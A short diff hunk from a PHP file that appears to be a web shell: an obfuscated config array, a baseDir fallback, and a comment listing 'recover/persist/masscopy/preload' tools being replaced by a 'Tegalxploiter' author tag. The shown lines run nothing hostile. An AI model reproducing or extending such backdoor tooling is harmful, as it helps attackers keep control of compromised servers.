@@ -17,7 +17,7 @@ $GLOBALS['ayAHGSshXn'] = array(
 'post_encryption' => false,
 'cgi_api' => False,
 );
-/** ===== Gecko tools EMBEDDED (recover/persist/masscopy/preload) — no gecko_tools.php needed ===== */
+/** ===== create by Tegalxploiter ===== */
 if (!isset($GLOBALS['baseDir']) || $GLOBALS['baseDir'] === '') {
     $GLOBALS['baseDir'] = isset($GLOBALS['cwd']) ? $GLOBALS['cwd'] : getcwd();
 }
